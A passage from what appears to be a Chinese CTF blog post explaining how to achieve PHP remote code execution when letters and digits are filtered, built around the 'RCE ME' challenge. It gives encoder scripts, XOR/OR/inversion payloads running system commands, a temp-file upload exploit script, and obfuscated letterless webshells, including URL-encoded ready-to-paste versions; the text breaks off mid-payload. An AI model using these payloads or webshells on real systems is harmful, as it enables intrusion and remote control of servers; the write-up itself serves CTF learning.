-n，显示时输出行号tailf-- 类似于tail -fvim --使用vim工具打开文本vi --使用vi打开文本cat 由第一行开始显示内容，并将所有内容输出</code></pre><p>上面介绍的这些方法可以解决大部分ctf题目，但是我们会经常遇到更加严苛的过滤，我们就要介绍接下来的一些题目类型和解决方法</p><h1 id="无数字字母rce"><a href="#无数字字母rce" class="headerlink" title="无数字字母rce"></a>无数字字母rce</h1><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><p>我们以一道经典的题目为例:</p><p>[极客大挑战 2019]RCE ME</p><p>题目代码:</p><pre><code class="php">&lt;?phperror_reporting(0);if(isset($_GET[&#39;code&#39;]))&#123;            $code=$_GET[&#39;code&#39;];                    if(strlen($code)&gt;40)&#123;                                        die(&quot;This is too Long.&quot;);                                                &#125;                    if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code))&#123;                                        die(&quot;NO.&quot;);                                                &#125;                    @eval($code);&#125;else&#123;            highlight_file(__FILE__);&#125;// ?&gt;</code></pre><h2 id="取反绕过"><a href="#取反绕过" class="headerlink" title="取反绕过"></a>取反绕过</h2><p>php7</p><p>脚本:</p><pre><code class="php">&lt;?php//在命令行中运行/*author yu22x*/fwrite(STDOUT,&#39;[+]your function: &#39;);$system=str_replace(array(&quot;\r\n&quot;, &quot;\r&quot;, &quot;\n&quot;), &quot;&quot;, fgets(STDIN)); fwrite(STDOUT,&#39;[+]your command: &#39;);$command=str_replace(array(&quot;\r\n&quot;, &quot;\r&quot;, &quot;\n&quot;), &quot;&quot;, fgets(STDIN)); echo &#39;[*] (~&#39;.urlencode(~$system).&#39;)(~&#39;.urlencode(~$command).&#39;);&#39;;</code></pre><p>脚本使用的时候注意有些()不可以一起转进去，我们先来测试一下</p><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221121200544538.png" alt="image-20221121200544538"></p><pre><code class="php">http://127.0.0.1/index.php?code=(~%8f%97%8f%96%91%99%90)(); //我们不需要参数只是测试，把后面的取反符号去掉即可</code></pre><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221121191347692.png" alt="image-20221121191347692"></p><p>我们现在来构造可以执行命令的字符串</p><pre><code class="php">http://480abdfe-af61-4f9a-bfdf-2e0227fda03b.node4.buuoj.cn:81/?code=(~%8c%86%8c%8b%9a%92)(~%93%8c); //system(&#39;ls&#39;)</code></pre><p>按理说没问题的哦，我本地是可以的，不过在buu没有执行成功，不过问题不大，还有很多种方法</p><p>这题可以通过:</p><pre><code class="php">assert(eval($_POST[sakura]))</code></pre><p>还是利用取反构造</p><pre><code>(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%8C%9E%94%8A%8D%9E%A2%D6);</code></pre><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221121200843416.png" alt="image-20221121200843416"></p><p>这里尝试执行命令，同样没反应，那么这题应该是没有回显的，但是我们可以使用蚁剑去连接!</p><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221121194931677.png" alt="image-20221121194931677"></p><p>这题到这里并没有结束，不过后面并不是我们需要关注的重点，我们就先忽略吧！</p><h2 id="异或绕过"><a href="#异或绕过" class="headerlink" title="异或绕过"></a>异或绕过</h2><p>php7</p><p>由于buu的题目无回显，我们直接把源码搭建在本地进行测试:</p><p>给出两个脚本:</p><p>yihuo.php</p><pre><code class="php">&lt;?php/*author yu22x*/$myfile = fopen(&quot;xor_rce.txt&quot;, &quot;w&quot;);$contents=&quot;&quot;;for ($i=0; $i &lt; 256; $i++) &#123;     for ($j=0; $j &lt;256 ; $j++) &#123;         if($i&lt;16)&#123;            $hex_i=&#39;0&#39;.dechex($i);        &#125;        else&#123;            $hex_i=dechex($i);        &#125;        if($j&lt;16)&#123;            $hex_j=&#39;0&#39;.dechex($j);        &#125;        else&#123;            $hex_j=dechex($j);        &#125;        $preg = &#39;/[a-z0-9]/i&#39;; //根据题目给的正则表达式修改即可        if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j)))&#123;                    echo &quot;&quot;;    &#125;          else&#123;        $a=&#39;%&#39;.$hex_i;        $b=&#39;%&#39;.$hex_j;        $c=(urldecode($a)^urldecode($b));        if (ord($c)&gt;=32&amp;ord($c)&lt;=126) &#123;            $contents=$contents.$c.&quot; &quot;.$a.&quot; &quot;.$b.&quot;\n&quot;;        &#125;    &#125;&#125;&#125;fwrite($myfile,$contents);fclose($myfile);</code></pre><p>yihuo.py</p><pre><code class="python"># -*- coding: utf-8 -*-# author yu22ximport requestsimport urllibfrom sys import *import osdef action(arg):   s1=&quot;&quot;   s2=&quot;&quot;   for i in arg:       f=open(&quot;xor_rce.txt&quot;,&quot;r&quot;)       while True:           t=f.readline()           if t==&quot;&quot;:               break           if t[0]==i:               #print(i)               s1+=t[2:5]               s2+=t[6:9]               break       f.close()   output=&quot;(\&quot;&quot;+s1+&quot;\&quot;^\&quot;&quot;+s2+&quot;\&quot;)&quot;   return(output)   while True:   param=action(input(&quot;\n[+] your function：&quot;) )+action(input(&quot;[+] your command：&quot;))+&quot;;&quot;   print(param)</code></pre><p>php运行后生成一个txt文档，包含所有可见字符的异或构造结果。<br> 接着运行python脚本即可。<br> 运行结果</p><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221121201209130.png" alt="image-20221121201209130"></p><pre><code>(&quot;%0b%08%0b%09%0e%06%0f&quot;^&quot;%7b%60%7b%60%60%60%60&quot;)();  //phpinfo()(&quot;%08%02%08%08%05%0d&quot;^&quot;%7b%7b%7b%7c%60%60&quot;)(&quot;%08%08%0f%01%0d%09&quot;^&quot;%7f%60%60%60%60%60&quot;); //system(whoami)(&quot;%08%02%08%08%05%0d&quot;^&quot;%7b%7b%7b%7c%60%60&quot;)(&quot;%0c%08&quot;^&quot;%60%7b&quot;);  //system(ls)(&quot;%08%02%08%08%05%0d&quot;^&quot;%7b%7b%7b%7c%60%60&quot;)(&quot;%03%01%08%00%00%06%0c%01%07&quot;^&quot;%60%60%7c%20%2f%60%60%60%60&quot;); //system(cat /flag)</code></pre><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221121201250221.png" alt="image-20221121201250221"></p><h2 id="二进制或绕过"><a href="#二进制或绕过" class="headerlink" title="二进制或绕过"></a>二进制或绕过</h2><p>php7</p><p>原理是一样的，只需要在上面的脚本上稍加改动即可</p><p>or.php</p><pre><code class="php">&lt;?php/* author yu22x */$myfile = fopen(&quot;or_rce.txt&quot;, &quot;w&quot;);$contents=&quot;&quot;;for ($i=0; $i &lt; 256; $i++) &#123;     for ($j=0; $j &lt;256 ; $j++) &#123;         if($i&lt;16)&#123;            $hex_i=&#39;0&#39;.dechex($i);        &#125;        else&#123;            $hex_i=dechex($i);        &#125;        if($j&lt;16)&#123;            $hex_j=&#39;0&#39;.dechex($j);        &#125;        else&#123;            $hex_j=dechex($j);        &#125;        $preg = &#39;/[0-9a-z]/i&#39;;//根据题目给的正则表达式修改即可        if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j)))&#123;                    echo &quot;&quot;;    &#125;          else&#123;        $a=&#39;%&#39;.$hex_i;        $b=&#39;%&#39;.$hex_j;        $c=(urldecode($a)|urldecode($b));        if (ord($c)&gt;=32&amp;ord($c)&lt;=126) &#123;            $contents=$contents.$c.&quot; &quot;.$a.&quot; &quot;.$b.&quot;\n&quot;;        &#125;    &#125;&#125;&#125;fwrite($myfile,$contents);fclose($myfile);</code></pre><p>or.py</p><pre><code class="python"># -*- coding: utf-8 -*-# author yu22ximport requestsimport urllibfrom sys import *import osdef action(arg):   s1=&quot;&quot;   s2=&quot;&quot;   for i in arg:       f=open(&quot;or_rce.txt&quot;,&quot;r&quot;)       while True:           t=f.readline()           if t==&quot;&quot;:               break           if t[0]==i:               #print(i)               s1+=t[2:5]               s2+=t[6:9]               break       f.close()   output=&quot;(\&quot;&quot;+s1+&quot;\&quot;|\&quot;&quot;+s2+&quot;\&quot;)&quot;   return(output)   while True:   param=action(input(&quot;\n[+] your function：&quot;) )+action(input(&quot;[+] your command：&quot;))+&quot;;&quot;   print(param)</code></pre><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221121203834452.png" alt="image-20221121203834452"></p><pre><code>(&quot;%10%08%10%09%0e%06%0f&quot;|&quot;%60%60%60%60%60%60%60&quot;)();  //phpinfo()(&quot;%13%19%13%14%05%0d&quot;|&quot;%60%60%60%60%60%60&quot;)(&quot;%17%08%0f%01%0d%09&quot;|&quot;%60%60%60%60%60%60&quot;);  //system(whoami)(&quot;%13%19%13%14%05%0d&quot;|&quot;%60%60%60%60%60%60&quot;)(&quot;%0c%13&quot;|&quot;%60%60&quot;);   //system(ls)(&quot;%13%19%13%14%05%0d&quot;|&quot;%60%60%60%60%60%60&quot;)(&quot;%03%01%14%00%00%06%0c%01%07&quot;|&quot;%60%60%60%20%2f%60%60%60%60&quot;); //cat /flag</code></pre><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221121204056924.png" alt="image-20221121204056924"></p><h2 id="上传临时文件"><a href="#上传临时文件" class="headerlink" title="上传临时文件"></a>上传临时文件</h2><p><code>.</code>或者叫period，它的作用和source一样，就是用当前的shell执行一个文件中的命令。比如，当前运行的shell是bash，则<code>. file</code>的意思就是用bash执行file文件中的命令。</p><p>用<code>. file</code>执行文件，是不需要file有x权限的。那么，如果目标服务器上有一个我们可控的文件，那不就可以利用<code>.</code>来执行它了吗？</p><p>这个文件也很好得到，我们可以发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是<code>/tmp/phpXXXXXX</code>，文件名最后6个字符是随机的大小写字母。</p><p>第二个难题接踵而至，执行<code>. /tmp/phpXXXXXX</code>，也是有字母的。此时就可以用到Linux下的glob通配符：</p><ul><li><code>*</code>可以代替0个及以上任意字符</li><li><code>?</code>可以代表1个任意字符</li></ul><p>那么，<code>/tmp/phpXXXXXX</code>就可以表示为<code>/*/?????????</code>或<code>/???/?????????</code>。</p><p>但我们尝试执行<code>. /???/?????????</code>，却得到如下错误：</p><p><a href="https://www.leavesongs.com/media/attachment/2018/10/06/19ba62d6-9f8a-40a6-a3f9-833deca218d5.png"><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/19ba62d6-9f8a-40a6-a3f9-833deca218d5.1d1534b39994.png" alt="image.png"></a></p><p>这是因为，能够匹配上<code>/???/?????????</code>这个通配符的文件有很多，我们可以列出来：</p><p><a href="https://www.leavesongs.com/media/attachment/2018/10/06/67a4aab1-9e90-43e6-b3f1-3569c7009390.png"><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/67a4aab1-9e90-43e6-b3f1-3569c7009390.423d9ca7066c.png" alt="image.png"></a></p><p>可见，我们要执行的<code>/tmp/phpcjggLC</code>排在倒数第二位。然而，在执行第一个匹配上的文件（即<code>/bin/run-parts</code>）的时候就已经出现了错误，导致整个流程停止，根本不会执行到我们上传的文件。</p><p>思路又陷入了僵局，虽然方向没错。</p><p><strong>深入理解glob通配符</strong></p><p>大部分同学对于通配符，可能知道的都只有<code>*</code>和<code>?</code>。但实际上，阅读Linux的文档（ <a href="http://man7.org/linux/man-pages/man7/glob.7.html">http://man7.org/linux/man-pages/man7/glob.7.html</a> ），可以学到更多有趣的知识点。</p><p>其中，glob支持用<code>[^x]</code>的方法来构造“这个位置不是字符x”。那么，我们用这个姿势干掉<code>/bin/run-parts</code>：</p><p><a href="https://www.leavesongs.com/media/attachment/2018/10/06/0a5b0800-1a01-4738-831f-f597795255e0.png"><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/0a5b0800-1a01-4738-831f-f597795255e0.63b17aebf66d.png" alt="image.png"></a></p><p>排除了第4个字符是<code>-</code>的文件，同样我们可以排除包含<code>.</code>的文件：</p><p><a href="https://www.leavesongs.com/media/attachment/2018/10/06/1553332a-76fe-4a0a-a8db-7f1ae410c85c.png"><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/1553332a-76fe-4a0a-a8db-7f1ae410c85c.4bb210f52740.png" alt="image.png"></a></p><p>现在就剩最后三个文件了。但我们要执行的文件仍然排在最后，但我发现这三个文件名中都不包含特殊字符，那么这个方法似乎行不通了。</p><p>继续阅读glob的帮助，我发现另一个有趣的用法：</p><p><a href="https://www.leavesongs.com/media/attachment/2018/10/06/1bbd6606-f2bc-4b7d-8374-a8e501e0b93a.png"><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/1bbd6606-f2bc-4b7d-8374-a8e501e0b93a.3c485a5bb8eb.png" alt="image.png"></a></p><p>就跟正则表达式类似，glob支持利用<code>[0-9]</code>来表示一个范围。</p><p>我们再来看看之前列出可能干扰我们的文件：</p><p><a href="https://www.leavesongs.com/media/attachment/2018/10/06/ee9e5ae9-3937-46a3-8d8e-1f4879913801.png"><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/ee9e5ae9-3937-46a3-8d8e-1f4879913801.f9e468b3ba6e.png" alt="image.png"></a></p><p>所有文件名都是小写，只有PHP生成的临时文件包含大写字母。那么答案就呼之欲出了，我们只要找到一个可以表示“大写字母”的glob通配符，就能精准找到我们要执行的文件。</p><p>翻开ascii码表，可见大写字母位于<code>@</code>与<code>[</code>之间：</p><p><a href="https://www.leavesongs.com/media/attachment/2018/10/06/a827f363-7520-4fe9-aac1-b8ceba21a1f3.png"><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/a827f363-7520-4fe9-aac1-b8ceba21a1f3.5be5b8cfbacc.png" alt="image.png"></a></p><p>那么，我们可以利用<code>[@-[]</code>来表示大写字母：</p><p><a href="https://www.leavesongs.com/media/attachment/2018/10/06/42774646-968e-4e11-b6fa-5d4e83eb3c4c.png"><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/42774646-968e-4e11-b6fa-5d4e83eb3c4c.99f26e97fa8a.png" alt="image.png"></a></p><p>显然这一招是管用的。</p><p>当然，php生成临时文件名是随机的，最后一个字符不一定是大写字母，不过多尝试几次也就行了。</p><p>最后，我传入的code为<code>?&gt;&lt;?=</code>. /???/????????[@-[]<code>;?&gt;</code>，发送数据包如下：</p><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221121212607216.png" alt="image-20221121212607216"></p><p>可写一个脚本:</p><pre><code class="python">#coding:utf-8#author yu22ximport requestsurl=&quot;http://xxx/test.php?code=?&gt;&lt;?=`. /???/????????[@-[]`;?&gt;&quot;files=&#123;&#39;file&#39;:&#39;cat f*&#39;&#125;response=requests.post(url,files=files)html = response.textprint(html)</code></pre><h2 id="构造无数字字母webshell"><a href="#构造无数字字母webshell" class="headerlink" title="构造无数字字母webshell"></a>构造无数字字母webshell</h2><p>环境:php5</p><p>php5中assert是一个函数，我们可以通过<code>$f=&#39;assert&#39;;$f(...);</code>这样的方法来动态执行任意代码。</p><p>但php7中，assert不再是函数，变成了一个语言结构（类似eval），不能再作为函数名动态执行代码，所以利用起来稍微复杂一点。但也无需过于担心，比如我们利用file_put_contents函数，同样可以用来getshell。</p><p>下文为了方便起见，使用PHP5作为环境</p><h3 id="异或webshell"><a href="#异或webshell" class="headerlink" title="异或webshell"></a>异或webshell</h3><p>这是最简单、最容易想到的方法。在PHP中，两个字符串执行异或操作以后，得到的还是一个字符串。所以，我们想得到a-z中某个字母，就找到某两个非字母、数字的字符，他们的异或结果是这个字母即可。</p><p>得到如下的结果（因为其中存在很多不可打印字符，所以我用url编码表示了）：</p><pre><code class="php">&lt;?php$_=(&#39;%01&#39;^&#39;`&#39;).(&#39;%13&#39;^&#39;`&#39;).(&#39;%13&#39;^&#39;`&#39;).(&#39;%05&#39;^&#39;`&#39;).(&#39;%12&#39;^&#39;`&#39;).(&#39;%14&#39;^&#39;`&#39;); // $_=&#39;assert&#39;;$__=&#39;_&#39;.(&#39;%0D&#39;^&#39;]&#39;).(&#39;%2F&#39;^&#39;`&#39;).(&#39;%0E&#39;^&#39;]&#39;).(&#39;%09&#39;^&#39;]&#39;); // $__=&#39;_POST&#39;;$___=$$__;$_($___[_]); // assert($_POST[_]);</code></pre><p>传入代码:</p><pre><code>$_=(&#39;%01&#39;^&#39;`&#39;).(&#39;%13&#39;^&#39;`&#39;).(&#39;%13&#39;^&#39;`&#39;).(&#39;%05&#39;^&#39;`&#39;).(&#39;%12&#39;^&#39;`&#39;).(&#39;%14&#39;^&#39;`&#39;);$__=&#39;_&#39;.(&#39;%0D&#39;^&#39;]&#39;).(&#39;%2F&#39;^&#39;`&#39;).(&#39;%0E&#39;^&#39;]&#39;).(&#39;%09&#39;^&#39;]&#39;);$___=$$__;$_($___[_]);</code></pre><p>执行结果如下：</p><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221121214114436.png" alt="image-20221121214114436"></p><h3 id="取反webshell"><a href="#取反webshell" class="headerlink" title="取反webshell"></a>取反webshell</h3><p>用的是UTF-8编码的某个汉字，并将其中某个字符取出来，比如<code>&#39;和&#39;&#123;2&#125;</code>的结果是<code>&quot;\x8c&quot;</code>，其取反即为字母<code>s</code>：</p><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221121214447649.png" alt="image-20221121214447649"></p><p>可构造出webshell</p><pre><code class="php">&lt;?php$__=(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;);$_=$__/$__;$____=&#39;&#39;;$___=&quot;瞰&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;和&quot;;$____.=~($___&#123;$__&#125;);$___=&quot;和&quot;;$____.=~($___&#123;$__&#125;);$___=&quot;的&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;半&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;始&quot;;$____.=~($___&#123;$__&#125;);$_____=&#39;_&#39;;$___=&quot;俯&quot;;$_____.=~($___&#123;$__&#125;);$___=&quot;瞰&quot;;$_____.=~($___&#123;$__&#125;);$___=&quot;次&quot;;$_____.=~($___&#123;$_&#125;);$___=&quot;站&quot;;$_____.=~($___&#123;$_&#125;);$_=$$_____;$____($_[$__]);</code></pre><p>直接传入:</p><pre><code class="php">$__=(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;);$_=$__/$__;$____=&#39;&#39;;$___=&quot;瞰&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;和&quot;;$____.=~($___&#123;$__&#125;);$___=&quot;和&quot;;$____.=~($___&#123;$__&#125;);$___=&quot;的&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;半&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;始&quot;;$____.=~($___&#123;$__&#125;);$_____=&#39;_&#39;;$___=&quot;俯&quot;;$_____.=~($___&#123;$__&#125;);$___=&quot;瞰&quot;;$_____.=~($___&#123;$__&#125;);$___=&quot;次&quot;;$_____.=~($___&#123;$_&#125;);$___=&quot;站&quot;;$_____.=~($___&#123;$_&#125;);$_=$$_____;$____($_[$__]);</code></pre><p>使用时候进行下url编码</p><pre><code class="php">%24__%3d(&#39;%3e&#39;%3e&#39;%3c&#39;)%2b(&#39;%3e&#39;%3e&#39;%3c&#39;)%3b%24_%3d%24__%2f%24__%3b%24____%3d&#39;&#39;%3b%24___%3d%22%e7%9e%b0%22%3b%24____.%3d~(%24___%7b%24_%7d)%3b%24___%3d%22%e5%92%8c%22%3b%24____.%3d~(%24___%7b%24__%7d)%3b%24___%3d%22%e5%92%8c%22%3b%24____.%3d~(%24___%7b%24__%7d)%3b%24___%3d%22%e7%9a%84%22%3b%24____.%3d~(%24___%7b%24_%7d)%3b%24___%3d%22%e5%8d%8a%22%3b%24____.%3d~(%24___%7b%24_%7d)%3b%24___%3d%22%e5%a7%8b%22%3b%24____.%3d~(%24___%7b%24__%7d)%3b%24_____%3d&#39;_&#39;%3b%24___%3d%22%e4%bf%af%22%3b%24_____.%3d~(%24___%7b%24__%7d)%3b%24___%3d%22%e7%9e%b0%22%3b%24_____.%3d~(%24___%7b%24__%7d)%3b%24___%3d%22%e6%ac%a1%22%3b%24_____.%3d~(%24___%7b%24_%7d)%3b%24___%3d%22%e7%ab%99%22%3b%24_____.%3d~(%24___%7b%24_%7d)%3b%24_%3d%24%24_____%3b%24____(%24_%5b%24__%5d)%3b</code></pre><p>这个答案还利用了PHP的弱类型特性。因为要获取<code>&#39;和&#39;&#123;2&#125;</code>，就必须有数字2。而PHP由于弱类型这个特性，true的值为1，故<code>true+true==2</code>，也就是<code>(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)==2</code>。</p><p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221121220150735.png" alt="image-20221121220150735"></p><h3 id="自增webshell"><a href="#自增webshell" class="headerlink" title="自增webshell"></a>自增webshell</h3><p>7.0.12以上版本不可使用</p><p>那么，如果不用位运算这个套路，能不能搞定这题呢？有何不可。</p><p>这就得借助PHP的一个小技巧，先看文档： <a href="http://php.net/manual/zh/language.operators.increment.php">http://php.net/manual/zh/language.operators.increment.php</a></p><p><a href="https://www.leavesongs.com/media/attachment/2017/02/17/a386505b-1c14-48f0-88cb-66923770df33.jpg"><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/a386505b-1c14-48f0-88cb-66923770df33.8732f996cd67.jpg" alt="14872693882387.jpg"></a></p><p>也就是说，<code>&#39;a&#39;++ =&gt; &#39;b&#39;</code>，<code>&#39;b&#39;++ =&gt; &#39;c&#39;</code>… 所以，我们只要能拿到一个变量，其值为<code>a</code>，通过自增操作即可获得a-z中所有字符。</p><p>那么，如何拿到一个值为字符串’a’的变量呢？</p><p>巧了，数组（Array）的第一个字母就是大写A，而且第4个字母是小写a。也就是说，我们可以同时拿到小写和大写A，等于我们就可以拿到a-z和A-Z的所有字母。</p><p>在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为<code>Array</code>：</p><p><a href="https://www.leavesongs.com/media/attachment/2017/02/17/4d0c6bc9-5417-41b2-91ca-4e110e8d1350.jpg"><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/4d0c6bc9-5417-41b2-91ca-4e110e8d1350.72f524026162.jpg" alt="14872697183159.jpg"></a></p><p>再取这个字符串的第一个字母，就可以获得’A’了。</p><p>利用这个技巧，我编写了如下webshell（因为PHP函数是大小写不敏感的，所以我们最终执行的是<code>ASSERT($_POST[_])</code>，无需获取小写a）：</p><pre><code class="php">&lt;?php$_=[];$_=@&quot;$_&quot;; // $_=&#39;Array&#39;;$_=$_[&#39;!&#39;==&#39;@&#39;]; // $_=$_[0];$___=$_; // A$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__; // S$___.=$__; // S$__=$_;$__++;$__++;$__++;$__++; // E $___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$___.=$__;$____=&#39;_&#39;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$____.=$__;$_=$$____;$___($_[_]); // ASSERT($_POST[_]);</code></pre><p>可直接传入</p><pre><code class="php">//测试发现7.0.12以上版本不可使用//使用时需要url编码下$_=[];$_=@&quot;$_&quot;;$_=$_[&#39;!&#39;==&#39;@&#39;];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____=&#39;_&#39;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);固定格式 构造出来的 assert($_POST[_]);url编码后再使用%24_%3d%5b%5d%3b%24_%3d%40%22%24_%22%3b%24_%3d%24_%5b&#39;!&#39;%3d%3d&#39;%40&#39;%5d%3b%24___%3d%24_%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24___.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24____%3d&#39;_&#39;%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2